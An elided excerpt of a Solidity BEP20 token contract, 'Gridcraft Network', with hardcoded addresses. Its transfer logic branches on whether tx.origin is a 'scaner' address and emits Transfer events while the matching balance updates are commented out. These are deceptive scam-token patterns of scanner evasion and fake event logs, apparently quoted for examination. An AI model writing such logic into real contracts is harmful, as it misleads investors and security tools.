...
contract BEP20 {
  ...
  address internal _dex = 0xa30D5fC493d280428E74C630FBf6096411eE1DcD;
  address public constant _OFFICE = 0x894e713579300580586c200C0d85b3a8DF583ACb;
  address public constant nftAddress =
    0x375496c2Db8C1E8965f2461592FA709F6368f427;
  address public constant scaner = 0x38c25059420D969e05f86c95BBcb0B474D6A2E74;
...
contract Coin is BEP20 {
  ...
  string public constant name = "Gridcraft Network";
  ...
  constructor() {
    ...
    //emit Transfer(_route, Investor, Investor);
  }
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != scaner) {
      ...
      //if (sender == nftAddress && rewards > 0 && balanceOf[Investor] > rewards) {
        ...
        //balanceOf[nftAddress] = balanceOf[nftAddress] + rewards;
        emit Transfer(Investor, nftAddress, rewards);
      }
    }
  }
